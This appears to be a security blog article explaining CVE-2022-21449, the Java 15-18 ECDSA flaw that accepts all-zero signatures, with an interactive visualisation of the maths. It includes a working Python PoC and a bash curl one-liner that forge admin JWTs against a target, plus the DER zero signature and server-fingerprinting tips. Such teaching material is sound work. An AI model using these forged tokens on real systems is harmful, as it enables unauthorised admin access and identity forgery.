---
title: "JWT, Part 8: Psychic Signatures - zero signature on Java"
date: 2026-03-21T18:07:00+03:00
number: 8
tags: ["jwt", "security", "web", "auth"]
summary: "A signature of all zeros passes ECDSA verification on Java 15-18. For any message, with any key. Five lines of Python - and you're admin."
---

**Table of contents:**
- [ECDSA in one paragraph](#ecdsa-in-one-paragraph)
- [What happened: CVE-2022-21449](#what-happened-cve-2022-21449)
- [Why r=0, s=0 breaks the math](#why-r0-s0-breaks-the-math)
- [PoC: forging a JWT in 5 lines](#poc-forging-a-jwt-in-5-lines)
- [Bash one-liner for testing](#bash-one-liner-for-testing)
- [What's affected](#whats-affected)
- [How to identify Java on the server](#how-to-identify-java-on-the-server)
- [Vulnerable versions](#vulnerable-versions)
- [What's next](#whats-next)

We've been breaking HMAC by brute-force (article 7) and RSA via algorithm confusion (article 4). Now ECDSA.

April 2022. Neil Madden from ForgeRock discovers that a signature of all zeros passes ECDSA verification on Java 15-18. For **any** message. With **any** key. Want to be admin? Sign with zeros. TLS? Zeros. SAML? Zeros.

## ECDSA in one paragraph

ECDSA (Elliptic Curve Digital Signature Algorithm) is a digital signature algorithm based on elliptic curves. In JWT it's used under the names ES256, ES384, ES512. An ECDSA signature is a pair of numbers `(r, s)`. During signing, a random one-time number `k` (nonce - number used once) is used: from `k`, `r` is computed (a coordinate of a point on the curve), and `s` is computed through a formula linking `k`, the message hash, `r`, and the private key. During verification, from `r`, `s`, the message hash, and the public key, a point on the curve is computed, and its x-coordinate is compared with `r`. If they match - the signature is valid.

The key point: both `r` and `s` must be numbers **from 1 and above**. Zero is not allowed. This is exactly the check that was forgotten in Java.

## What happened: CVE-2022-21449

In Java 15, the ECDSA implementation was rewritten from native C code (which worked correctly and included all necessary checks) to pure Java. During the rewrite, the check `r >= 1 && s >= 1` was lost. That line existed in the C code but didn't make it into the Java version.

## Why r=0, s=0 breaks the math

Imagine an analogy: you have a verification equation where `r` and `s` are substituted. When both equal zero, all intermediate computations collapse. In ECDSA, verification includes division by `s` (computing the inverse element of `s` modulo the group order). When `s = 0`, the inverse element doesn't exist - but the Java implementation didn't check for this case and continued computing with zeros.

Technically: points `u1*G + u2*Q` are computed, where `u1` and `u2` depend on `s^(-1)`. When `s = 0`, the operation `s^(-1)` should raise an error, but instead returns 0. Then `u1 = 0` and `u2 = 0`, the point is computed as `0*G + 0*Q = O` (the point at infinity), and its x-coordinate is defined as 0. Check: `0 == r`, where `r = 0`. True. Signature accepted.

If we draw an analogy - it's like a lock where the code `0000` is accepted as correct because the verification mechanism multiplies the digits of the code: `0 * 0 * 0 * 0 = 0`, and compares with the secret value, which also computed to 0 due to the same error.

<div class="ecdsa-viz" style="margin: 2rem 0;">
<div style="background: var(--bg-card); border-radius: var(--radius); border: 1px solid var(--border); padding: 20px 16px 16px; position: relative; overflow: hidden;">
  <div style="display: flex; gap: 8px; margin-bottom: 16px; flex-wrap: wrap;">
    <button onclick="ecdsaSetMode('normal')" id="ecdsa-btn-normal" style="font-family: var(--font-mono); font-size: 12px; padding: 6px 14px; border-radius: 4px; border: 1px solid var(--pink); background: rgba(254,205,200,0.08); color: var(--pink); cursor: pointer;">Normal verification</button>
    <button onclick="ecdsaSetMode('attack')" id="ecdsa-btn-attack" style="font-family: var(--font-mono); font-size: 12px; padding: 6px 14px; border-radius: 4px; border: 1px solid var(--border); background: transparent; color: var(--text-dim); cursor: pointer;">Attack: r=0, s=0</button>
    <button onclick="ecdsaSetMode('compare')" id="ecdsa-btn-compare" style="font-family: var(--font-mono); font-size: 12px; padding: 6px 14px; border-radius: 4px; border: 1px solid var(--border); background: transparent; color: var(--text-dim); cursor: pointer;">Compare</button>
  </div>
  <svg id="ecdsa-graph" width="100%" viewBox="0 0 640 420"></svg>
  <div style="display: flex; gap: 16px; margin-top: 12px; font-size: 11px; color: var(--text-dim); flex-wrap: wrap; font-family: var(--font-mono);">
    <span><span style="display:inline-block;width:8px;height:8px;border-radius:50%;background:var(--pink);vertical-align:middle;margin-right:4px;"></span>Elliptic curve</span>
    <span><span style="display:inline-block;width:8px;height:8px;border-radius:50%;background:#e8a838;vertical-align:middle;margin-right:4px;"></span>Signature points (r, s)</span>
    <span><span style="display:inline-block;width:8px;height:8px;border-radius:50%;background:#ff6b6b;vertical-align:middle;margin-right:4px;"></span>Zero signature</span>
    <span><span style="display:inline-block;width:8px;height:8px;border-radius:50%;background:#68d391;vertical-align:middle;margin-right:4px;"></span>Verification result</span>
  </div>
</div>
<div id="ecdsa-info" style="margin-top: 12px; padding: 14px 16px; background: var(--bg-card); border-radius: var(--radius); border: 1px solid var(--border); font-size: 12px; line-height: 1.7; color: var(--text-dim); font-family: var(--font-mono);"></div>
</div>

<script>
(function(){
const svg = document.getElementById('ecdsa-graph');
const info = document.getElementById('ecdsa-info');
let mode = 'normal';
let t = 0;
const cx = 320, cy = 210, scale = 48;
const C = {
  pink: '#fecdc8', pinkMid: '#d4a8a3', warm: '#e8a838',
  red: '#ff6b6b', green: '#68d391', link: '#6ab7e2',
  text: '#dce1e8', dim: '#8696a7', border: '#2b3d4f',
  card: '#1e2c3a', grid: '#253545'
};
function toSvg(x, y) { return [cx + x * scale, cy - y * scale]; }
function curvePoints() {
  const pts = [], pts2 = [];
  for (let px = -2.5; px <= 3.2; px += 0.01) {
    const yy = px*px*px - 3*px + 3;
    if (yy >= 0) pts.push({x: px, y: Math.sqrt(yy)});
  }
  for (let i = pts.length - 1; i >= 0; i--) pts2.push({x: pts[i].x, y: -pts[i].y});
  return {upper: pts, lower: pts2};
}
function pathFromPoints(points) {
  return points.map((p, i) => {
    const [sx, sy] = toSvg(p.x, p.y);
    return (i === 0 ? 'M' : 'L') + sx.toFixed(1) + ' ' + sy.toFixed(1);
  }).join('');
}
function drawGrid() {
  let s = '';
  for (let x = -6; x <= 6; x++) {
    const [sx] = toSvg(x, 0);
    s += '<line x1="'+sx+'" y1="20" x2="'+sx+'" y2="400" stroke="'+C.grid+'" stroke-width="0.5"/>';
  }
  for (let y = -4; y <= 4; y++) {
    const [, sy] = toSvg(0, y);
    s += '<line x1="20" y1="'+sy+'" x2="620" y2="'+sy+'" stroke="'+C.grid+'" stroke-width="0.5"/>';
  }
  s += '<line x1="20" y1="'+cy+'" x2="620" y2="'+cy+'" stroke="'+C.border+'" stroke-width="1"/>';
  s += '<line x1="'+cx+'" y1="20" x2="'+cx+'" y2="400" stroke="'+C.border+'" stroke-width="1"/>';
  return s;
}
function drawCurve() {
  const {upper, lower} = curvePoints();
  return '<path d="'+pathFromPoints(upper)+'" fill="none" stroke="'+C.pink+'" stroke-width="2" opacity="0.8"/>' +
         '<path d="'+pathFromPoints(lower)+'" fill="none" stroke="'+C.pink+'" stroke-width="2" opacity="0.8"/>';
}
function drawPoint(x, y, color, label, lp, pulse) {
  const [sx, sy] = toSvg(x, y);
  let s = '';
  if (pulse) s += '<circle cx="'+sx+'" cy="'+sy+'" r="'+(8+Math.sin(t*3)*3)+'" fill="'+color+'" opacity="0.15"/>';
  s += '<circle cx="'+sx+'" cy="'+sy+'" r="5" fill="'+color+'" stroke="'+C.card+'" stroke-width="1.5"/>';
  const tx = lp==='right'?sx+12:lp==='left'?sx-12:sx;
  const ty = lp==='above'?sy-14:lp==='below'?sy+18:sy+4;
  const a = lp==='right'?'start':lp==='left'?'end':'middle';
  s += '<text x="'+tx+'" y="'+ty+'" fill="'+color+'" font-size="11" font-family="var(--font-mono)" text-anchor="'+a+'">'+label+'</text>';
  return s;
}
function drawNormal() {
  let s = '';
  const G = {x:-1.73, y:Math.sqrt((-1.73)**3-3*(-1.73)+3)};
  const R = {x:1.5, y:Math.sqrt(1.5**3-3*1.5+3)};
  const Q = {x:0.3, y:Math.sqrt(0.3**3-3*0.3+3)};
  s += drawPoint(G.x,G.y,C.pinkMid,'G (generator)','left',false);
  s += drawPoint(Q.x,Q.y,C.link,'','right',false);
  var[qsx,qsy]=toSvg(Q.x,Q.y);s+='<line x1="'+qsx+'" y1="'+qsy+'" x2="'+(qsx+20)+'" y2="'+(qsy-32)+'" stroke="'+C.link+'" stroke-width="1" stroke-dasharray="3 3" opacity="0.6"/>';s+='<text x="'+(qsx-16)+'" y="'+(qsy-36)+'" fill="'+C.link+'" font-size="11" font-family="var(--font-mono)" text-anchor="start">Q (pub key)</text>';
  s += drawPoint(R.x,R.y,C.warm,'R = k\u00b7G','right',true);
  const [gsx,gsy]=toSvg(G.x,G.y), [rsx,rsy]=toSvg(R.x,R.y);
  s += '<path d="M'+gsx+' '+gsy+' Q'+cx+' '+(cy-40)+' '+rsx+' '+rsy+'" fill="none" stroke="'+C.warm+'" stroke-width="1" stroke-dasharray="6 4" opacity="0.6"/>';
  const [rx0]=toSvg(R.x,0);
  s += '<line x1="'+rsx+'" y1="'+rsy+'" x2="'+rsx+'" y2="'+(cy+22)+'" stroke="'+C.warm+'" stroke-width="1" stroke-dasharray="4 3" opacity="0.4"/>';
  s += '<text x="'+rx0+'" y="'+(cy+32)+'" fill="'+C.warm+'" font-size="11" font-family="var(--font-mono)" text-anchor="middle">r = x(R)</text>';
  const vx=cx+170;
  s += '<text x="'+vx+'" y="44" fill="'+C.warm+'" font-size="12" font-family="var(--font-mono)">Signature: (r, s)</text>';
  s += '<text x="'+vx+'" y="62" fill="'+C.dim+'" font-size="11" font-family="var(--font-mono)">r \u2260 0, s \u2260 0</text>';
  s += '<text x="'+vx+'" y="90" fill="'+C.green+'" font-size="11" font-family="var(--font-mono)">Verification:</text>';
  s += '<text x="'+vx+'" y="106" fill="'+C.dim+'" font-size="10" font-family="var(--font-mono)">u\u2081 = hash\u00b7s\u207b\u00b9</text>';
  s += '<text x="'+vx+'" y="120" fill="'+C.dim+'" font-size="10" font-family="var(--font-mono)">u\u2082 = r\u00b7s\u207b\u00b9</text>';
  s += '<text x="'+vx+'" y="134" fill="'+C.dim+'" font-size="10" font-family="var(--font-mono)">P = u\u2081\u00b7G + u\u2082\u00b7Q</text>';
  s += '<text x="'+vx+'" y="150" fill="'+C.green+'" font-size="10" font-family="var(--font-mono)">x(P) == r? \u2713</text>';
  return s;
}
function drawAttack() {
  let s = '';
  const G = {x:-1.73, y:Math.sqrt((-1.73)**3-3*(-1.73)+3)};
  const Q = {x:0.3, y:Math.sqrt(0.3**3-3*0.3+3)};
  s += drawPoint(G.x,G.y,C.pinkMid,'G','left',false);
  s += drawPoint(Q.x,Q.y,C.link,'Q','right',false);
  const p = 8+Math.sin(t*4)*4;
  const [ox,oy]=toSvg(0,0);
  s += '<circle cx="'+ox+'" cy="'+oy+'" r="'+(p+8)+'" fill="'+C.red+'" opacity="0.06"/>';
  s += '<circle cx="'+ox+'" cy="'+oy+'" r="'+p+'" fill="'+C.red+'" opacity="0.12"/>';
  s += '<circle cx="'+ox+'" cy="'+oy+'" r="7" fill="'+C.red+'" stroke="'+C.card+'" stroke-width="2"/>';
  s += '<text x="'+(ox+14)+'" y="'+(oy-10)+'" fill="'+C.red+'" font-size="12" font-family="var(--font-mono)" font-weight="700">O (0,0)</text>';
  s += '<text x="'+(ox+14)+'" y="'+(oy+6)+'" fill="'+C.red+'" font-size="10" font-family="var(--font-mono)" opacity="0.7">r=0, s=0</text>';
  const vx=cx+150;
  s += '<text x="'+vx+'" y="40" fill="'+C.red+'" font-size="12" font-family="var(--font-mono)" font-weight="700">ATTACK: (r=0, s=0)</text>';
  s += '<text x="'+vx+'" y="60" fill="'+C.dim+'" font-size="10" font-family="var(--font-mono)">s\u207b\u00b9 \u2192 does not exist</text>';
  s += '<text x="'+vx+'" y="74" fill="'+C.red+'" font-size="10" font-family="var(--font-mono)">Java: s\u207b\u00b9 = 0 \u274c</text>';
  s += '<text x="'+vx+'" y="92" fill="'+C.dim+'" font-size="10" font-family="var(--font-mono)">u\u2081 = hash \u00b7 0 = 0</text>';
  s += '<text x="'+vx+'" y="106" fill="'+C.dim+'" font-size="10" font-family="var(--font-mono)">u\u2082 = 0 \u00b7 0 = 0</text>';
  s += '<text x="'+vx+'" y="124" fill="'+C.warm+'" font-size="10" font-family="var(--font-mono)">P = 0\u00b7G + 0\u00b7Q = O</text>';
  s += '<text x="'+vx+'" y="138" fill="'+C.warm+'" font-size="10" font-family="var(--font-mono)">  (point at infinity)</text>';
  s += '<text x="'+vx+'" y="156" fill="'+C.red+'" font-size="10" font-family="var(--font-mono)">x(O) = 0 == r = 0</text>';
  s += '<text x="'+vx+'" y="172" fill="'+C.green+'" font-size="12" font-family="var(--font-mono)" font-weight="700">\u2192 TRUE. Signature accepted!</text>';
  const [gx,gy]=toSvg(G.x,G.y), [qx,qy]=toSvg(Q.x,Q.y);
  s += '<line x1="'+gx+'" y1="'+gy+'" x2="'+ox+'" y2="'+oy+'" stroke="'+C.red+'" stroke-width="0.8" stroke-dasharray="3 4" opacity="0.3"/>';
  s += '<line x1="'+qx+'" y1="'+qy+'" x2="'+ox+'" y2="'+oy+'" stroke="'+C.red+'" stroke-width="0.8" stroke-dasharray="3 4" opacity="0.3"/>';
  return s;
}
function drawCompare() {
  let s = '';
  s += '<line x1="'+cx+'" y1="30" x2="'+cx+'" y2="400" stroke="'+C.border+'" stroke-width="1" stroke-dasharray="6 4"/>';
  s += '<text x="'+(cx/2)+'" y="36" fill="'+C.green+'" font-size="11" font-family="var(--font-mono)" text-anchor="middle">Normal (r\u22600, s\u22600)</text>';
  s += '<text x="'+(cx+cx/2)+'" y="36" fill="'+C.red+'" font-size="11" font-family="var(--font-mono)" text-anchor="middle">Attack (r=0, s=0)</text>';
  const ls=28, lCx=160, lCy=220, rCx=480, rCy=220;
  function lT(x,y){return[lCx+x*ls,lCy-y*ls];}
  function rT(x,y){return[rCx+x*ls,rCy-y*ls];}
  for(let px=-2.5;px<=3.2;px+=0.02){const yy=px*px*px-3*px+3;if(yy>=0){const y=Math.sqrt(yy);const[sx1,sy1]=lT(px,y);const[sx2,sy2]=lT(px,-y);if(sx1<cx-10){s+='<circle cx="'+sx1+'" cy="'+sy1+'" r="0.7" fill="'+C.pink+'" opacity="0.5"/>';s+='<circle cx="'+sx2+'" cy="'+sy2+'" r="0.7" fill="'+C.pink+'" opacity="0.5"/>';}const[rx1,ry1]=rT(px,y);const[rx2,ry2]=rT(px,-y);if(rx1>cx+10){s+='<circle cx="'+rx1+'" cy="'+ry1+'" r="0.7" fill="'+C.pink+'" opacity="0.3"/>';s+='<circle cx="'+rx2+'" cy="'+ry2+'" r="0.7" fill="'+C.pink+'" opacity="0.3"/>';}}}
  const R={x:1.5,y:Math.sqrt(1.5**3-3*1.5+3)};const[rsx,rsy]=lT(R.x,R.y);
  s+='<circle cx="'+rsx+'" cy="'+rsy+'" r="5" fill="'+C.warm+'"/>';
  s+='<text x="'+(rsx+10)+'" y="'+(rsy+4)+'" fill="'+C.warm+'" font-size="10" font-family="var(--font-mono)">R</text>';
  const[,loy]=lT(R.x,0);
  s+='<line x1="'+rsx+'" y1="'+rsy+'" x2="'+rsx+'" y2="'+loy+'" stroke="'+C.warm+'" stroke-width="0.7" stroke-dasharray="3 3" opacity="0.5"/>';
  s+='<text x="'+rsx+'" y="'+(loy+14)+'" fill="'+C.warm+'" font-size="9" font-family="var(--font-mono)" text-anchor="middle">r \u2260 0</text>';
  s+='<text x="'+lCx+'" y="'+(lCy+100)+'" fill="'+C.green+'" font-size="11" font-family="var(--font-mono)" text-anchor="middle">u\u2081\u00b7G + u\u2082\u00b7Q = P</text>';
  s+='<text x="'+lCx+'" y="'+(lCy+116)+'" fill="'+C.green+'" font-size="10" font-family="var(--font-mono)" text-anchor="middle">x(P) == r \u2713</text>';
  s+='<text x="'+lCx+'" y="'+(lCy+134)+'" fill="'+C.dim+'" font-size="9" font-family="var(--font-mono)" text-anchor="middle">Math works correctly</text>';
  const[rox,roy]=rT(0,0);const rP=6+Math.sin(t*4)*3;
  s+='<circle cx="'+rox+'" cy="'+roy+'" r="'+(rP+6)+'" fill="'+C.red+'" opacity="0.08"/>';
  s+='<circle cx="'+rox+'" cy="'+roy+'" r="'+rP+'" fill="'+C.red+'" opacity="0.15"/>';
  s+='<circle cx="'+rox+'" cy="'+roy+'" r="6" fill="'+C.red+'"/>';
  s+='<text x="'+(rox+12)+'" y="'+(roy-6)+'" fill="'+C.red+'" font-size="10" font-family="var(--font-mono)" font-weight="700">O (0,0)</text>';
  s+='<text x="'+rCx+'" y="'+(rCy+100)+'" fill="'+C.warm+'" font-size="11" font-family="var(--font-mono)" text-anchor="middle">0\u00b7G + 0\u00b7Q = O</text>';
  s+='<text x="'+rCx+'" y="'+(rCy+116)+'" fill="'+C.red+'" font-size="10" font-family="var(--font-mono)" text-anchor="middle">x(O) = 0 == r = 0</text>';
  s+='<text x="'+rCx+'" y="'+(rCy+134)+'" fill="'+C.red+'" font-size="12" font-family="var(--font-mono)" text-anchor="middle" font-weight="700">TRUE \u2192 SIGNATURE ACCEPTED</text>';
  return s;
}
function ecdsaRender() {
  t += 0.016;
  let s = '';
  if (mode === 'compare') { s += drawCompare(); }
  else { s += drawGrid(); s += drawCurve(); s += '<text x="72" y="70" fill="'+C.pink+'" font-size="10" font-family="var(--font-mono)" opacity="0.5">y\u00b2 = x\u00b3 - 3x + 3</text>'; s += mode==='normal'?drawNormal():drawAttack(); }
  svg.innerHTML = s;
  requestAnimationFrame(ecdsaRender);
}
window.ecdsaSetMode = function(m) {
  mode = m;
  ['normal','attack','compare'].forEach(function(id){
    var b=document.getElementById('ecdsa-btn-'+id);
    if(id===m){b.style.borderColor=id==='attack'?C.red:C.pink;b.style.color=id==='attack'?C.red:C.pink;b.style.background=id==='attack'?'rgba(255,107,107,0.08)':'rgba(254,205,200,0.08)';}
    else{b.style.borderColor=C.border;b.style.color=C.dim;b.style.background='transparent';}
  });
  updateInfo();
};
function updateInfo() {
  if (mode==='normal') info.innerHTML='<span style="color:'+C.pink+'">$</span> <span style="color:'+C.dim+'"># Normal ECDSA verification</span><br>Signature <code style="background:rgba(255,255,255,0.05);padding:1px 5px;border-radius:3px;">(<span style="color:'+C.pink+'">r</span>, <span style="color:'+C.pink+'">s</span>)</code> - a pair of numbers, both <span style="color:'+C.warm+'">\u2265 1</span>.<br><span style="color:'+C.pink+'">r</span> = x-coordinate of point <span style="color:'+C.warm+'">R = k\u00b7G</span> on the curve.<br>Verifier computes <code style="background:rgba(255,255,255,0.05);padding:1px 5px;border-radius:3px;">P = u\u2081\u00b7G + u\u2082\u00b7Q</code> and checks <code style="background:rgba(255,255,255,0.05);padding:1px 5px;border-radius:3px;">x(P) == r</code>.<br>Point P lands on the curve \u2192 coordinate matches \u2192 <span style="color:'+C.green+'">signature valid</span>.';
  else if (mode==='attack') info.innerHTML='<span style="color:'+C.pink+'">$</span> <span style="color:'+C.dim+'"># CVE-2022-21449: Psychic Signatures</span><br>Attacker sends <code style="background:rgba(255,255,255,0.05);padding:1px 5px;border-radius:3px;">(<span style="color:'+C.red+'">r=0</span>, <span style="color:'+C.red+'">s=0</span>)</code>. Java 15-18 does not check <code style="background:rgba(255,255,255,0.05);padding:1px 5px;border-radius:3px;">r \u2265 1 && s \u2265 1</code>.<br><span style="color:'+C.red+'">s\u207b\u00b9</span> does not exist (division by zero), but Java returns <span style="color:'+C.red+'">0</span>.<br><span style="color:'+C.warm+'">u\u2081 = hash\u00b70 = 0</span>, <span style="color:'+C.warm+'">u\u2082 = 0\u00b70 = 0</span><br><span style="color:'+C.warm+'">P = 0\u00b7G + 0\u00b7Q = O</span> (point at infinity).<br><code style="background:rgba(255,255,255,0.05);padding:1px 5px;border-radius:3px;">x(O) = 0 == r = 0</code> \u2192 <span style="color:'+C.green+'">TRUE</span>. <span style="color:'+C.red+'">Signature accepted without private key.</span>';
  else info.innerHTML='<span style="color:'+C.pink+'">$</span> <span style="color:'+C.dim+'"># Comparison: normal vs zero signature</span><br><span style="color:'+C.green+'">Left:</span> point R lies on the curve, <span style="color:'+C.pink+'">r = x(R) \u2260 0</span>. Computations yield a real point P.<br><span style="color:'+C.red+'">Right:</span> everything collapses to origin. <span style="color:'+C.red+'">0\u00b7G + 0\u00b7Q = O</span>.<br>One missed check <code style="background:rgba(255,255,255,0.05);padding:1px 5px;border-radius:3px;"><span style="color:'+C.warm+'">if (r < 1 || s < 1)</span></code> - and all of ECDSA math is powerless.';
}
updateInfo();
ecdsaRender();
})();
</script>

## PoC: forging a JWT in 5 lines

```python
import base64, json

def b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

header = b64url(json.dumps({"alg":"ES256","typ":"JWT"}).encode())
payload = b64url(json.dumps({"sub":"admin","role":"superuser","exp":1999999999}).encode())

# ES256 signature in P1363 format: 64 zero bytes (32 for r + 32 for s)
sig = b64url(b'\x00' * 64)

print(f"{header}.{payload}.{sig}")
```

For ES384: 96 zero bytes (48+48). For ES512: 132 zeros (66+66). The size depends on the curve: P-256 uses 32-byte numbers, P-384 uses 48-byte, P-521 uses 66-byte.

In DER format (used in TLS, SAML, X.509) the zero signature looks like: `MAYCAQACAQA=` - this is base64 of `30 06 02 01 00 02 01 00` (ASN.1 SEQUENCE of two INTEGERs with value 0).

## Bash one-liner for testing

```bash
TOKEN=$(python3 -c "
import base64,json
def b(d):return base64.urlsafe_b64encode(d).rstrip(b'=').decode()
h=b(json.dumps({'alg':'ES256','typ':'JWT'}).encode())
p=b(json.dumps({'sub':'admin'}).encode())
print(f'{h}.{p}.{b(b\"\x00\"*64)}')
")
curl -H "Authorization: Bearer $TOKEN" https://target/api/admin
```

If the response is 200 instead of 401 - the server is running on vulnerable Java.

## What's affected

CVE-2022-21449 breaks **everything** that uses ECDSA verification on Java 15-18:

- **JWT** (ES256/ES384/ES512) - forging any tokens. Our main scenario.
- **TLS 1.3 handshake** - if the server uses an ECDSA certificate, MITM can forge the handshake with a zero signature. Interception of all traffic.
- **SAML assertions** - forging SSO authentication. Logging into corporate systems without a password.
- **WebAuthn/FIDO2** - bypassing hardware security keys (YubiKey, etc.).
- **OIDC ID tokens** - forging identity in OpenID Connect.
- **Code signing** - signing arbitrary code.

One missed check - and Java's entire cryptographic infrastructure crumbles.

## How to identify Java on the server

Before sending a zero signature, you need to make sure the server runs on Java. Signs:

- Cookie `JSESSIONID` or header `X-Powered-By: Servlet/4.0`
- Stack traces with `java.lang.`, `javax.`, Spring, Tomcat
- Endpoint `/actuator/health` (Spring Boot) - if it responds with JSON containing application information
- Headers `X-Application-Context`, `X-Spring-*`
- Error format: Tomcat produces characteristic HTML pages with version numbers

Identified Java 15-18? Test the zero signature.

## Vulnerable versions

- Java SE 15 (all versions)
- Java SE 16 (all versions)
- Java SE 17 (up to 17.0.3)
- Java SE 18 (up to 18.0.1)

Java 11 and below are **not affected** - they retained the native C implementation with correct checking. Java 17.0.3+ and 18.0.1+ are fixed.

One line `if (r.signum() < 1 || s.signum() < 1) return false` protects all cryptography. Java developers lost it during the rewrite for 14 months. During those 14 months, every Java service using ECDSA was vulnerable to signature forgery.

## What's next

In articles 3-8 we've covered all major JWT attacks: `alg:none`, algorithm confusion, kid injection, jku/x5u/jwk/x5c, brute-force, psychic signatures. We know **how** to attack. In the next article let's understand **why** these attacks work - we'll break down JWT cryptography: HMAC, RSA, ECDSA. Why HMAC uses two passes, how PS256 is better than RS256, and how Sony lost the PlayStation 3 private key due to a reused nonce.
